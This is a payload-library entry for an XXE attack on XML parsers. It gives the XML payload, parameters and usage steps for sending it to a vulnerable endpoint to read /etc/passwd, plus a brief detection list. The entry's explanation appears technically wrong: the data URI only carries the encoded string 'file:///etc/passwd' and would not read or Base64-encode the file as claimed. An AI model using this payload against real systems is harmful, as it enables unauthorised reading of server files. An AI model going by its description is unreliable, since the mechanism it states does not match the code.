---
id: 3e7accec-25ed-4e82-bbb6-be72b8a20eac
name: XXE-Base64-File-Retrieval-Payload
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:44.166517+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - xxe
  - payload
  - file-retrieval
  - base64
validated: true
---

# XXE-Base64-File-Retrieval-Payload

## Code

```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```

## Description

This XML payload exploits an XXE vulnerability by defining an external parameter entity that reads a local file (e.g., /etc/passwd) and encodes its contents in Base64 using a data URI scheme. When processed by a vulnerable XML parser, the entity expansion embeds the encoded data in the output, allowing retrieval without direct file inclusion.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| File Path in Entity | Target file path to read and encode (modify the Base64 part of the data URI) | file:///etc/passwd (Base64: ZmlsZTovLy9ldGMvcGFzc3dk) |

## Usage

Save this as an XML file (e.g., payload.xml) and send it to a vulnerable endpoint using tools like curl or Burp Suite. The payload triggers during XML parsing, and the response will contain the Base64-encoded file if the entity resolves. Decode the output offline to access the file contents. Used in procedures like [[procedures/XXE-File-Retrieval-via-Base64-Encoding]] for information disclosure.

## Detection

- XML parser logs showing DOCTYPE processing or entity expansions.
- WAF alerts for payloads with external entities or data URIs.
- Anomalous file reads on the server (e.g., via audit logs).
- Response analysis for unexpected Base64 strings in XML outputs.

## Related

- [[procedures/XXE-File-Retrieval-via-Base64-Encoding]]
- [[Burp-Suite]]
